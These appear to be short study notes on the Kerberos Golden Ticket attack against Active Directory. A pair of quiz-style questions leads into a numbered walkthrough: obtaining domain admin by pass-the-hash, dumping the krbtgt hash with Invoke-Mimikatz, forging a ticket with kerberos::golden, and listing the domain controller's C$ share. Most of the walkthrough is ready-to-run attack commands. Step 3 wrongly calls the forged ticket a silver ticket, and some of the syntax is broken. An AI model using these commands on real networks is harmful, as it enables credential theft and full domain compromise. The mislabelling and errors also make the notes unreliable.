Golden ticket
-------------
What is the primary objective of a Golden Ticket attack in Active Directory? > To impersonate legitimate users and access network resources without detection

Which type of Kerberos ticket is forged in a Golden Ticket attack? > Ticket Granting Ticket (TGT)

Golden ticket attack > kerberos identity authentication protocol attack > krbtgt(a service account that issues with kerberos ticket)

1. Pass the hash to domain admin

2. Get Krbtgt account hash
C:> invoke-mimikatz -command '"lsadump::lsa /patch"' -Computername prod.research.SECURITY.local

3. Generate silver ticket to the administrator with KDC

C:> invoke-mimikatz -command '"kerberos::golden /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440(domin-user) /krbtgt:03842934823jdf29234532 
/id:500 /group:512 /startoffset:0 /endin:600 renewmax:10080 /ptt"'

4. Check the ticket
C:> klist 

If you want to delete all tickets,
C:> klist purge

5. Finally can access the domain controller
ls \\prod.research.security.local\c$
